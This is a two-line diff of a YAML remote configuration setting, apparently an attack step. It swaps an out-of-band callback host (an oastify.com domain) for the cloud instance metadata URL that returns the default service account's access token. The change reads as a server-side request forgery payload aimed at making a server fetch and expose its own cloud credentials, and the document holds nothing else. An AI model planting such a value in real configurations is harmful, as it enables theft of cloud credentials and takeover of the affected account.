@@ -1,2 +1,2 @@
 remote_config:
-  url: "https://bjyl75jln7zanbiosphlmoy5vw1nwbl.oastify.com/A.yaml"
+  url: "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
